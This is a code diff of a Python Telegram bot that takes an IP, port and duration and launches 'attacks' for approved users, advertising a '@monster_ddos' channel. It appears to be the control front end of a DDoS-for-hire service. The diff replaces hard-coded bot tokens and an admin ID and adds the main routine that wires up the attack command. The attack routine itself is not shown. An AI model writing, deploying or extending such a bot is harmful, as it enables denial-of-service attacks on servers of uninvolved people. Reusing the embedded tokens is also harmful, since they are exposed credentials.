@@ -4,8 +4,8 @@ from telegram.ext import Application, CommandHandler, CallbackContext
 from keep_alive import keep_alive
 keep_alive()
 
-TELEGRAM_BOT_TOKEN = '7481827995:AAHbdhiYvuRRzzzcgTIppoNqW6MfUCuSbTE'
-ADMIN_USER_ID = 5195565978
+TELEGRAM_BOT_TOKEN = '8121244840:AAG7ix_TVgI_05cGZ1--9WiU17ebEIVORho'
+ADMIN_USER_ID = 7353797869
 USERS_FILE = 'users.txt'
 attack_in_progress = False
 
@@ -37,7 +37,7 @@ async def manage(update: Update, context: CallbackContext):
     args = context.args
 
     if chat_id != ADMIN_USER_ID:
-        await context.bot.send_message(chat_id=chat_id, text="*⚠️ YOU NEED ADMIN APPROVAL TO USE THIS COMMAND.\n\n🔗JOIN:-\nOWNER:- @Ak_mods_owner 🚀*", parse_mode='Markdown')
+        await context.bot.send_message(chat_id=chat_id, text="*⚠️ YOU NEED ADMIN APPROVAL TO USE THIS COMMAND.\n\n🔗JOIN:- @monster_ddos\nOWNER:- @Ak_mods_owner 🚀*", parse_mode='Markdown')
         return
 
     if len(args) != 2:
@@ -104,7 +104,18 @@ async def attack(update: Update, context: CallbackContext):
         f"*⚔️ ATTACK LAUNCHED! ⚔️*\n"
         f"*🎯 TARGET: {ip}:{port}*\n"
         f"*🕒 DURATION: {duration} seconds*\n"
-        f"*🔥 ANTIBAN PROXY SERVER STARTING ♻️\n\n🔗JOIN:- @Ak_mods_owner *"
+        f"*🔥 ANTIBAN PROXY SERVER STARTING ♻️\n\n🔗JOIN:- @monster_ddos *"
     ), parse_mode='Markdown')
 
     asyncio.create_task(run_attack(chat_id, ip, port, duration, context))
+
+def main():
+    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
+    application.add_handler(CommandHandler("start", start))
+    application.add_handler(CommandHandler("manage", manage))
+    application.add_handler(CommandHandler("attack", attack))
+    application.run_polling()
+
+if __name__ == '__main__':
+    main()
+
